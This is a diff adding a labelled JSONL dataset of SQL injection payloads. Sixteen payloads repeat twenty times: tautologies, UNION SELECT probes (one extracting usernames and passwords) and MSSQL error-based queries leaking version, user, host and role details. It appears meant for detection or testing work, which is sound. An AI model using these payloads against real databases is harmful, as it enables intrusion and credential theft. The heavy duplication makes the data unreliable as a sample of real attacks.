@@ -1,0 +1,320 @@
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT user_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT db_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT host_name()))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT current_user))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--", "attack_type": "SQLI"}
+{"payload": "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--", "attack_type": "SQLI"}
